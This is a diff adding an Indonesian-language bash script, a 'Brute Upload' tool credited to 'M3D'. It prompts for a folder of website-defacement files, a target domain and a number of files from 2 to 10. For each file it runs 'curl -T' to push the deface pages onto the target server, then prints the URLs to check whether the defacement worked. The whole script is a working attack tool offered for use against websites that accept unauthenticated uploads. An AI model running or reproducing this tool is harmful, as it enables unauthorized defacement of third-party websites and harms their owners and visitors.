@@ -1,0 +1,367 @@
+#!/usr/bin/bash
+a='\e[1;31m'
+b='\e[1;32m'
+c='\e[1;33m'
+d='\e[1;34m'
+e='\e[1;35m'
+f='\e[1;36m'
+g='\e[1;37m'
+NOW=`date "+%d.%m.%Y"`
+TIME=`date "+%H:%M"`
+
+trap ctrl_c INT
+ctrl_c() {
+echo ""
+echo -e $a '=>\033[97;1m ( CTRL + C ) \033[91;1mTerdeteksi '
+sleep 1
+echo -e $c '=> Terimakasih Sudah Memakai Tools Saya ini '
+sleep 1
+echo -e $g '=> \033[91;1mM3D \033[97;1m[$]=> \033[91;1mEnter Untuk Lanjut Keluar'
+read enter
+exit
+}
+
+clear
+echo -e $b ''
+figlet -f slant "M3D" |lolcat
+ echo    "======================================"|lolcat
+ echo      " AUTHOR      : M3D"|lolcat
+ echo      " Tools       : Brute Upload"|lolcat
+ echo      " Whatsapp    : 081353398031 "|lolcat
+ echo      " Date        : " $NOW | lolcat
+ echo      " Time        : " $TIME | lolcat
+ echo    "======================================"|lolcat
+sleep 1
+echo -e $c 'Mari Kita Mulai'
+sleep 1
+echo -e $c 'Tolong Letakkan Semua Script Deface Dalam Satu Folder'
+sleep 1
+echo -e $c 'Tekan Enter Untuk Lanjut Masuk'
+read enter
+sleep 1
+echo -e $a 'Masukkan Alamat Script Deface'
+echo -e $a 'Contoh : /sdcard || /storage/emulated/0'
+read -p ' [Masukkan]=>> ' almt
+sleep 1
+echo -e $b 'Masukkan Alamat Target'
+echo -e $b 'Contoh : jormid.net'
+read -p ' [Masukkan]=>> ' tg
+sleep 1
+echo -e $c 'Mau Berapa Target =>> Min 2 =>> Max 10'
+echo -e $c 'Contoh : 2 || 10'
+read -p ' [Masukkan]=>> ' go
+
+if [ $go = 2 ]
+then
+clear
+echo -e $a ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 3 ]
+then
+clear
+echo -e $b ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 4 ]
+then
+clear
+echo -e $c ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+read -p ' Keempat : ' ke4
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+curl -T $almt/$ke4 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo "Cek : $tg/$ke4"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 5 ]
+then
+clear
+echo -e $d ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+read -p ' Keempat : ' ke4
+read -p ' Kelima : ' ke5
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+curl -T $almt/$ke4 $tg
+curl -T $almt/$ke5 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo "Cek : $tg/$ke4"
+echo "Cek : $tg/$ke5"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 6 ]
+then
+clear
+echo -e $e ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+read -p ' Keempat : ' ke4
+read -p ' Kelima : ' ke5
+read -p ' Keenam : ' ke6
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+curl -T $almt/$ke4 $tg
+curl -T $almt/$ke5 $tg
+curl -T $almt/$ke6 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo "Cek : $tg/$ke4"
+echo "Cek : $tg/$ke5"
+echo "Cek : $tg/$ke6"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 7 ]
+then
+clear
+echo -e $f ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+read -p ' Keempat : ' ke4
+read -p ' Kelima : ' ke5
+read -p ' Keenam : ' ke6
+read -p ' ketujuh : ' ke7
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+curl -T $almt/$ke4 $tg
+curl -T $almt/$ke5 $tg
+curl -T $almt/$ke6 $tg
+curl -T $almt/$ke7 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo "Cek : $tg/$ke4"
+echo "Cek : $tg/$ke5"
+echo "Cek : $tg/$ke6"
+echo "Cek : $tg/$ke7"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 8 ]
+then
+clear
+echo -e $a ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+read -p ' Keempat : ' ke4
+read -p ' Kelima : ' ke5
+read -p ' Keenam : ' ke6
+read -p ' ketujuh : ' ke7
+read -p ' Kedelapan : ' ke8
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+curl -T $almt/$ke4 $tg
+curl -T $almt/$ke5 $tg
+curl -T $almt/$ke6 $tg
+curl -T $almt/$ke7 $tg
+curl -T $almt/$ke8 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo "Cek : $tg/$ke4"
+echo "Cek : $tg/$ke5"
+echo "Cek : $tg/$ke6"
+echo "Cek : $tg/$ke7"
+echo "Cek : $tg/$ke8"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 9 ]
+then
+clear
+echo -e $b ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : M3D.html || M3D.png'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+read -p ' Keempat : ' ke4
+read -p ' Kelima : ' ke5
+read -p ' Keenam : ' ke6
+read -p ' ketujuh : ' ke7
+read -p ' Kedelapan : ' ke8
+read -p ' Kesembilan : ' ke9
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+curl -T $almt/$ke4 $tg
+curl -T $almt/$ke5 $tg
+curl -T $almt/$ke6 $tg
+curl -T $almt/$ke7 $tg
+curl -T $almt/$ke8 $tg
+curl -T $almt/$ke9 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo "Cek : $tg/$ke4"
+echo "Cek : $tg/$ke5"
+echo "Cek : $tg/$ke6"
+echo "Cek : $tg/$ke7"
+echo "Cek : $tg/$ke8"
+echo "Cek : $tg/$ke9"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
+
+if [ $go = 10 ]
+then
+clear
+echo -e $c ''
+figlet "M3D" |lolcat
+sleep 1
+echo 'Masukkan Nama Script Deface || Filenya'
+echo 'Contoh : m3d.html || m3d'
+sleep 1
+read -p ' Pertama : ' ke1
+read -p ' Kedua : ' ke2
+read -p ' Ketiga : ' ke3
+read -p ' Keempat : ' ke4
+read -p ' Kelima : ' ke5
+read -p ' Keenam : ' ke6
+read -p ' ketujuh : ' ke7
+read -p ' Kedelapan : ' ke8
+read -p ' Kesembilan : ' ke9
+read -p ' Kesepuluh : ' ke10
+echo 'Please Wait'
+sleep 1
+curl -T $almt/$ke1 $tg
+curl -T $almt/$ke2 $tg
+curl -T $almt/$ke3 $tg
+curl -T $almt/$ke4 $tg
+curl -T $almt/$ke5 $tg
+curl -T $almt/$ke6 $tg
+curl -T $almt/$ke7 $tg
+curl -T $almt/$ke8 $tg
+curl -T $almt/$ke9 $tg
+curl -T $almt/$ke10 $tg
+echo 'Sudah Selesai'
+echo "Cek : $tg/$ke1"
+echo "Cek : $tg/$ke2"
+echo "Cek : $tg/$ke3"
+echo "Cek : $tg/$ke4"
+echo "Cek : $tg/$ke5"
+echo "Cek : $tg/$ke6"
+echo "Cek : $tg/$ke7"
+echo "Cek : $tg/$ke8"
+echo "Cek : $tg/$ke9"
+echo "Cek : $tg/$ke10"
+echo 'Jika Tidak Bisa di Akses Berarti Gagal'
+sleep 1
+echo 'Bay-Bay'
+fi
